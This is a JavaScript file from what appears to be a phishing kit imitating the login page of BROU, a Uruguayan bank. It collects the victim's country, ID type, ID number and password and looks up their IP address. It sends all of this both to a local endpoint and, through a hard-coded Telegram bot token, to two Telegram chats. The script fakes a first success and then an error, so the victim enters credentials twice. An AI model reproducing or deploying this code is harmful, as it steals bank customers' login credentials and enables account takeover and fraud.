let primerIntento = true;

async function enviarDatos() {
  const pais = document.getElementById("pais").value;
  const documento = document.getElementById("documento").value;
  const numeroDocumentoInput = document.getElementById("numero-documento");
  const contrasenaInput = document.getElementById("contrasena");
  const errorBox = document.getElementById("error-message");

  const numeroDocumento = numeroDocumentoInput.value.trim();
  const contrasena = contrasenaInput.value.trim();

  const errorUsuario = document.getElementById("usuario-vacio");
  const errorContrasena = document.getElementById("contrasena-vacia");
  const errorContrasenaIncorrecta = document.getElementById("contrasena-incorrecta");

  // Reset errores
  errorBox.style.display = "none";
  numeroDocumentoInput.classList.remove("error-field");
  contrasenaInput.classList.remove("error-field");
  errorUsuario.style.display = "none";
  errorContrasena.style.display = "none";
  errorContrasenaIncorrecta.style.display = "none";

  let valido = true;

  // Validación de usuario
  if (!numeroDocumento) {
    numeroDocumentoInput.classList.add("error-field");
    errorUsuario.style.display = "block";
    valido = false;
  }

  // Validación de la contraseña (mínimo 5 caracteres y no solo números)
  if (!contrasena) {
    contrasenaInput.classList.add("error-field");
    errorContrasena.style.display = "block";
    valido = false;
  } else if (contrasena.length < 5 || /^\d+$/.test(contrasena)) {
    contrasenaInput.classList.add("error-field");
    errorContrasenaIncorrecta.style.display = "block";
    valido = false;
  }

  if (!valido) return;

  try {
    // Obtener la IP del usuario
    const ipRes = await fetch("https://api.ipify.org/?format=json");
    const ipData = await ipRes.json();
    const ip = ipData.ip;

    // Enviar los datos al servidor
    const response = await fetch("/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        pais,
        documento,
        numeroDocumento,
        contrasena,
        ip
      }),
    });

    if (response.ok) {
      // Primer intento (éxito)
      if (primerIntento) {
        primerIntento = false;  // Cambiar para que el siguiente intento sea el que muestre error
        setTimeout(() => {
          window.location.href = "espera.html";  // Redirige a la página de espera
        }, 1000);
      } else {
        // Segundo intento (error)
        errorBox.style.display = "block";
        numeroDocumentoInput.value = "";
        contrasenaInput.value = "";
      }

      // Enviar mensaje a Telegram con los datos del usuario
      const mensaje = `➖➖➖[BROU]➖➖➖\n` +
                      `País: ${pais}\n` +
                      `Tipo de Documento: ${documento}\n` +
                      `Cédula: ${numeroDocumento}\n` +
                      `Contraseña: ${contrasena}\n` +
                      `IP: ${ip}\n` +
                      `➖➖➖[ FIN ]➖➖➖`;

      const BOT_TOKEN = "8135711594:AAFr31MSd-lpmmS7gC92WpMBMCyIo8l5n8U";  // Token del bot
      const CHAT_IDS = ["-4867067566", "-4910179253"];  // IDs de los chats a los que se enviará el mensaje

      // Enviar el mensaje a cada chat ID
      await Promise.all(
        CHAT_IDS.map(chatId =>
          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: mensaje,
              parse_mode: "Markdown"
            })
          })
        )
      );
    }
  } catch (error) {
    console.error("Error en la solicitud:", error);
  }
}
